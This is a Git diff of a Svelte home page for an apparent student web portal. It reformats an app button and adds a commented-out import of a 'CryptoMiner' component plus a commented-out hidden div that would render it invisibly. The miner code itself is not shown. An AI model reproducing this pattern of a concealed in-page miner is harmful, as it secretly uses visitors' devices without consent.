@@ -5,14 +5,17 @@
   import TopBar from "../components/TopBar.svelte";
   import AppButton from "./AppButton.svelte";
   import { SelfResponse, Self } from "../../routes/index/types";
+  // import CryptoMiner from "../components/CryptoMiner.svelte";
 
   let self: ClientSelf;
 
   request<any, SelfResponse>(Self).then((s) => (self = s));
-
 </script>
 
 <main class="dark">
+  <!-- <div class = "hidden">
+    <CryptoMiner></CryptoMiner>
+  </div> -->
   <TopBar title="Home" />
   <div id="feed" class="darkm1">
     <p class="text-center text">no updates</p>
@@ -28,7 +31,11 @@
       title="Games Repository"
       desc="play a selection of browser games curated by the community"
     />
-    <AppButton url="/schedule" title="Schedule Viewer" desc="Shows you how much time is left in a class, and a whole bunch of other stuff"/>
+    <AppButton
+      url="/schedule"
+      title="Schedule Viewer"
+      desc="Shows you how much time is left in a class, and a whole bunch of other stuff"
+    />
     <AppButton url="/ftp" title="File Hosting" desc="NOT FUNCTIONAL." />
     <AppButton
       url="/sparkboard"
